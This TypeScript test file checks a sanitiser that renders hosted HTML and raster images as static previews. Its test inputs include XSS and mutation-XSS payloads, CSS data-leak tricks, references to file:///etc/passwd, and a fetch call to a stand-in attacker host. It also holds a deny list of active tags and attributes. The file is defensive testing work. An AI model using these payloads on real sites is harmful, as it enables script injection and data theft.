// @vitest-environment node
import { parse, type DefaultTreeAdapterTypes } from "parse5";
import { describe, expect, it } from "vitest";

import { buildWebsiteRenderedPreview, WEBSITE_RENDERED_PREVIEW_CSP, WEBSITE_RENDERED_PREVIEW_MAX_OUTPUT_BYTES } from "./website-rendered-preview.js";

const encoder = new TextEncoder();
const tinyPng = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+a6XcAAAAASUVORK5CYII=", "base64");

function render(source: string, contentType = "text/html"): string {
  return buildWebsiteRenderedPreview({ bytes: encoder.encode(source), contentType }).html;
}

function elements(source: string): DefaultTreeAdapterTypes.Element[] {
  const found: DefaultTreeAdapterTypes.Element[] = [];
  const visit = (node: DefaultTreeAdapterTypes.Node): void => {
    if ("tagName" in node) found.push(node);
    if ("childNodes" in node) node.childNodes.forEach(visit);
  };
  visit(parse(source));
  return found;
}

function jpeg(width: number, height: number): Uint8Array {
  // Header-shaped fixture for byte/dimension guards. Chromium remains responsible for decoding.
  return Uint8Array.of(0xff, 0xd8, 0xff, 0xc0, 0x00, 0x0b, 0x08,
    height >> 8, height & 255, width >> 8, width & 255, 0x01, 0x01, 0x11, 0x00,
    0xff, 0xda, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00, 0x3f, 0x00, 0x12, 0xff, 0x00, 0x34, 0xff, 0xd9);
}

describe("static hosted HTML previews", () => {
  it("preserves ordinary structure, inert anchors, stylesheets and inline formatting", () => {
    const output = render('<!doctype html><html><head><style>h1,.greeting p { color: red; margin: 8px } body { background-color: #fff }</style></head><body class="greeting" style="padding:16px"><main><h1 style="color:rgb(20,30,40);font-size:2em">Hello &amp; welcome</h1><a href="https://example.test">A link</a><table><tr><td colspan="2">Cell</td></tr></table></main></body></html>');
    expect(output).toContain("h1,.greeting p{color:red;margin:8px}");
    expect(output).toContain('body class="greeting" style="padding:16px"');
    expect(output).toContain('<h1 style="color:rgb(20,30,40);font-size:2em">Hello &amp; welcome</h1>');
    expect(output).toContain("<a>A link</a>");
    expect(output).toContain('colspan="2"');
    expect(output).not.toContain("https://example.test");
  });

  it("places a restrictive CSP before all input and provides the same policy for response headers", () => {
    const output = render('<meta http-equiv="Content-Security-Policy" content="script-src *"><base href="https://attacker.invalid"><meta http-equiv="refresh" content="0;url=https://attacker.invalid"><h1>Content</h1>');
    const metas = elements(output).filter((node) => node.tagName === "meta");
    expect(metas).toHaveLength(3);
    expect(metas[0]?.attrs).toEqual([
      { name: "http-equiv", value: "Content-Security-Policy" },
      { name: "content", value: WEBSITE_RENDERED_PREVIEW_CSP },
    ]);
    expect(WEBSITE_RENDERED_PREVIEW_CSP).toContain("script-src 'none'");
    expect(WEBSITE_RENDERED_PREVIEW_CSP).toContain("sandbox");
    expect(WEBSITE_RENDERED_PREVIEW_CSP).toContain("form-action 'none'");
    expect(output.indexOf("Content-Security-Policy")).toBeLessThan(output.indexOf("<h1>"));
    expect(output).not.toContain("attacker.invalid");
  });

  it.each([
    '<script>window.sliver.deleteWebsite({name:"x"})</script><p onclick="fetch(\'https://attacker.invalid\')">Visible</p>',
    '<iframe srcdoc="<script>alert(1)</script>" src="https://attacker.invalid"></iframe><webview src="file:///etc/passwd" preload="evil.js"></webview>',
    '<object data="https://attacker.invalid/test.pdf"></object><embed src="data:text/html,<script>alert(1)</script>"><audio src="x"><video src="x"><source srcset="x">',
    '<form action="https://attacker.invalid"><input autofocus onfocus="alert(1)"><button formaction="https://attacker.invalid">Send</button></form>',
    '<svg onload="alert(1)"><foreignObject><iframe src="https://attacker.invalid"></iframe></foreignObject><script>alert(1)</script></svg><math><mtext><img src="x" onerror="alert(1)"></mtext></math>',
    '<img src="https://attacker.invalid" srcset="file:///etc/passwd 2x" onerror="alert(1)"><picture><source srcset="data:image/svg+xml,<svg onload=alert(1)>"></picture>',
    '<template shadowrootmode="open"><script>alert(1)</script><img src="x"></template><noscript><img src="x" onerror="alert(1)"></noscript>',
    '<link rel="stylesheet" href="https://attacker.invalid"><link rel="prefetch" href="file:///etc/passwd"><meta http-equiv="refresh" content="0;url=data:text/html,evil">',
  ])("removes active markup and resource attributes: %s", (payload) => {
    const output = render(payload);
    const parsed = elements(output);
    const active = new Set(["script", "iframe", "webview", "object", "embed", "audio", "video", "source", "form", "input", "button", "svg", "math", "img", "picture", "template", "noscript", "link", "base"]);
    expect(parsed.filter((node) => active.has(node.tagName))).toEqual([]);
    expect(parsed.flatMap((node) => node.attrs).filter((attribute) => /^(?:on|src|href|action|formaction|data$|poster|background|ping|download)/iu.test(attribute.name))).toEqual([]);
    expect(output).not.toContain("attacker.invalid");
  });

  it.each([
    '<p><svg><style><img src=x onerror=alert(1)></style></svg></p>',
    '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">',
    '<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>',
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">text',
    '<plaintext><img src=x onerror=alert(1)>',
  ])("reparses hostile/malformed namespace markup into only safe elements", (payload) => {
    const parsed = elements(render(payload));
    expect(parsed.some((node) => ["svg", "math", "img", "script", "form"].includes(node.tagName))).toBe(false);
    expect(parsed.flatMap((node) => node.attrs).some((attribute) => attribute.name.startsWith("on"))).toBe(false);
  });

  it("drops external CSS, custom properties, escaped URL functions, fixed positioning and complex selectors", () => {
    const output = render('<style>@import "https://attacker.invalid"; @font-face{font-family:evil;src:url(file:///etc/passwd)} body:has(img){color:red} a[href^="secret"]{background:url(https://attacker.invalid)} .safe{color:blue;position:fixed;background-image:u\\72l(https://attacker.invalid);--secret:red;cursor:url(x),auto;behavior:url(x);filter:url(x);font-family:var(--secret)}</style><p style="color:green;background:url(https://attacker.invalid);width:expression(alert(1));position:absolute;--x:red;-moz-binding:url(x)">Text</p>');
    expect(output).toContain(".safe{color:blue}");
    expect(output).toContain('<p style="color:green">Text</p>');
    expect(output).not.toMatch(/attacker|@import|@font-face|:has|\[href|expression|url\(|position:|--secret|behavior|binding/u);
  });

  it("escapes all preserved attribute and text values without creating markup", () => {
    const output = render('<p title="&quot;&gt;&lt;img src=x onerror=alert(1)&gt;">&lt;script&gt;alert(1)&lt;/script&gt;</p><style>p{font-family:"&lt;/style&gt;";color:red}</style>');
    expect(elements(output).some((node) => node.tagName === "img" || node.tagName === "script")).toBe(false);
    expect(output).toContain("&lt;script&gt;alert(1)&lt;/script&gt;");
  });

  it("rejects oversized HTML, excessive nodes, deep nesting, and large attributes before rendering", () => {
    expect(() => render("a".repeat(1024 * 1024 + 1))).toThrow(/1 MiB/);
    expect(() => render("<br>".repeat(10_001))).toThrow(/node limit/);
    expect(() => render("<div>".repeat(81))).toThrow(/nesting limit/);
    expect(() => render(`<p title="${"a".repeat(8193)}">text</p>`)).toThrow(/attribute limit/);
    expect(() => render(`<p ${Array.from({ length: 65 }, (_, index) => `data-${index}="x"`).join(" ")}>text</p>`)).toThrow(/attribute limit/);
    expect(() => render(`<body><body title="${"a".repeat(8193)}">text`)).toThrow(/attribute limit/);
  });

  it("bounds CSS bytes, tokens, and recursion including malformed unmatched closing tokens", () => {
    expect(() => render(`<style>${" ".repeat(64 * 1024 + 1)}</style>`)).toThrow(/CSS size limit/);
    expect(() => render(`<style>${"a{}".repeat(501)}</style>`)).toThrow(/CSS rule limit/);
    expect(() => render(`<p style="color:${"rgb(".repeat(17)}0${")".repeat(17)}">x</p>`)).toThrow(/CSS nesting limit/);
    expect(() => render(`<p style="${")".repeat(100)}color:${"rgb(".repeat(17)}0${")".repeat(17)}">x</p>`)).toThrow(/CSS nesting limit/);
  });

  it("rejects non-UTF8 and unsupported media despite plausible source bytes", () => {
    expect(() => buildWebsiteRenderedPreview({ bytes: Uint8Array.of(0xff), contentType: "text/html" })).toThrow(/UTF-8/);
    for (const contentType of ["image/svg+xml", "application/pdf", "text/javascript", "image/gif", "image/webp", "text/plain"]) {
      expect(() => render("<h1>Not HTML</h1>", contentType)).toThrow(/supports HTML, PNG, and JPEG/);
    }
    expect(render("<h1>XHTML source</h1>", "application/xhtml+xml; charset=utf-8")).toContain("<h1>XHTML source</h1>");
  });
});

describe("standalone raster previews", () => {
  it("generates the only allowed image URL from sniffed PNG bytes", () => {
    const result = buildWebsiteRenderedPreview({ bytes: tinyPng, contentType: "image/png" });
    const image = elements(result.html).find((node) => node.tagName === "img");
    expect(result.kind).toBe("raster");
    expect(image?.attrs.find((attribute) => attribute.name === "src")?.value).toBe(`data:image/png;base64,${tinyPng.toString("base64")}`);
    expect(Buffer.byteLength(result.html)).toBeLessThan(WEBSITE_RENDERED_PREVIEW_MAX_OUTPUT_BYTES);
  });

  it("checks JPEG frame dimensions across segment and escaped scan bytes", () => {
    const result = buildWebsiteRenderedPreview({ bytes: jpeg(10, 20), contentType: "image/jpeg" });
    expect(result.kind).toBe("raster");
    expect(result.html).toContain('width="10" height="20"');
    expect(() => buildWebsiteRenderedPreview({ bytes: jpeg(4097, 1), contentType: "image/jpeg" })).toThrow(/4096 pixels/);
    expect(() => buildWebsiteRenderedPreview({ bytes: jpeg(4000, 4000), contentType: "image/jpeg" })).toThrow(/8 million/);
  });

  it("rejects MIME spoofing, oversized images, invalid chunks, and animated PNGs", () => {
    expect(() => render("<svg onload=alert(1)></svg>", "image/png")).toThrow(/PNG/);
    expect(() => buildWebsiteRenderedPreview({ bytes: tinyPng, contentType: "image/jpeg" })).toThrow(/JPEG/);
    expect(() => buildWebsiteRenderedPreview({ bytes: new Uint8Array(8 * 1024 * 1024 + 1), contentType: "image/png" })).toThrow(/8 MiB/);
    const large = Buffer.from(tinyPng);
    large.writeUInt32BE(100_000, 16);
    expect(() => buildWebsiteRenderedPreview({ bytes: large, contentType: "image/png" })).toThrow(/4096 pixels/);
    const badChunk = Buffer.from(tinyPng);
    badChunk.writeUInt32BE(0xffffffff, 33);
    expect(() => buildWebsiteRenderedPreview({ bytes: badChunk, contentType: "image/png" })).toThrow(/Invalid/);
    const animated = Buffer.from(tinyPng);
    animated.write("acTL", 37, "ascii");
    expect(() => buildWebsiteRenderedPreview({ bytes: animated, contentType: "image/png" })).toThrow(/animated/);
    expect(() => buildWebsiteRenderedPreview({ bytes: tinyPng.subarray(0, -1), contentType: "image/png" })).toThrow(/PNG/);
  });

  it("rejects a second JPEG frame or trailing embedded data", () => {
    const first = Buffer.from(jpeg(1, 1));
    const second = Buffer.from(jpeg(10000, 10000));
    const joined = Buffer.concat([first.subarray(0, -2), second.subarray(2)]);
    expect(() => buildWebsiteRenderedPreview({ bytes: joined, contentType: "image/jpeg" })).toThrow(/JPEG/);
    expect(() => buildWebsiteRenderedPreview({ bytes: Buffer.concat([first, Buffer.from("<script>alert(1)</script>")]), contentType: "image/jpeg" })).toThrow(/JPEG/);
    const lateDimensions = Buffer.concat([first.subarray(0, -2), Buffer.from([0xff, 0xdc, 0, 4, 255, 255, 0xff, 0xd9])]);
    expect(() => buildWebsiteRenderedPreview({ bytes: lateDimensions, contentType: "image/jpeg" })).toThrow(/Unsupported JPEG marker/);
  });
});
